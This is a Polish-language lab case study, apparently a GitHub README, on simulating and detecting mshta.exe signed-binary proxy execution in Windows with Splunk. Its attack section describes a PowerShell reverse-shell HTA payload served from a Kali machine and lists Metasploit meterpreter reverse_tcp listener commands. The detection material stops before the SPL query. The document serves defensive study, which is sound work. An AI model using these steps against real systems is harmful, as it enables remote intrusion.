# Case Study: Detekcja i Analiza Proxy Execution z Użyciem LOLBin (mshta.exe) w Środowisku Windows / Splunk Enterprise

## 1. Cel projektu
Celem tego projektu laboratoryjnego jest przeprowadzenie, zarejestrowanie oraz wykrycie zaawansowanego ataku typu **Living off the Land (LotL)** z wykorzystaniem natywnego, podpisanego cyfrowo narzędzia systemowego Windows – **`mshta.exe`** (Microsoft HTML Application Host).

Atak polega na zdalnym pobraniu i wykonaniu złośliwego skryptu HTA (HTML Application) z serwera atakującego (Kali Linux), co pozwala na ominięcie podstawowych mechanizmów kontroli aplikacji oraz ukrycie złośliwej aktywności pod płaszczykiem legalnego procesu systemowego.

W ramach projektu skonfigurowano odpowiednią telemetrię na stacji roboczej Windows 10, przesłano logi do **Splunk Enterprise** za pomocą **Splunk Universal Forwarder**, przeprowadzono symulację ataku oraz zaprojektowano zapytanie SPL do detekcji zagrożenia.

## 2. MITRE ATT&CK Mapowanie

| ID Taktyki / Techniki | Nazwa Techniki | Opis w Kontekscie Scenariusza |
| :--- | :--- | :--- |
| **TA0005** (Defense Evasion) | **T1218.005** - Signed Binary Proxy Execution: Mshta | Wykorzystanie zaufanego, podpisanego przez Microsoft pliku `mshta.exe` do załadowania i wykonania kodu HTML/VBScript/PowerShell z pominięciem restrykcji. |
| **TA0002** (Execution) | **T1059.005** - Command and Scripting Interpreter: Visual Basic / JScript | Wykonanie złośliwego payloadu osadzonego wewnątrz struktury HTA za pomocą silnika skryptowego MSHTML. |
| **TA0011** (Command and Control) | **T1071.001** - Application Layer Protocol: Web Protocols | Nawiązanie połączenia zwrotnego (Reverse Shell) przez HTTP do stacji atakującego (Kali Linux). |

### Wyjaśnienie analityka:
`mshta.exe` to plik wykonywalny odpowiedzialny za uruchamianie plików `.hta`, które mogą zawierać osadzony kod skryptowy oraz komponenty ActiveX. Ponieważ plik jest natywnie obecny w systemie Windows i podpisany cyfrowo przez Microsoft, analitycy SOC często przeoczają jego nietypowe wywołania sieciowe. Przestępcy chętnie wykorzystują go do pobierania payloadów Stage-2 w pamięci (Memory-only execution), co utrudnia detekcję opartą na plikach dyskowych.

## 3. Metodologia ataku 

### Krok 1: Przygotowanie środowiska atakującego (Kali Linux)

<img width="665" height="813" alt="2" src="https://github.com/user-attachments/assets/1c81269f-99ca-4507-a2f6-771fdca407b9" />

Na stacji Kali Linux wygenerowałem złośliwy payload HTA zawierający kod PowerShell (reverse shell) oraz uruchomiłe lokalny serwer Apache (`apache2`) w celu dystrybucji pliku.

### Krok 2: Konfiguracja nasłuchu

<img width="669" height="539" alt="1" src="https://github.com/user-attachments/assets/e29447ea-0f48-4b52-b5c8-6e89705d72ef" />

Skonfigurowano moduł multi/handler w konsoli Metasploit, aby oczekiwać na połączenie zwrotne od stacji roboczej Windows 10. 

Komendy Kali: 
```
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.107
set LPORT 4444
exploit
```
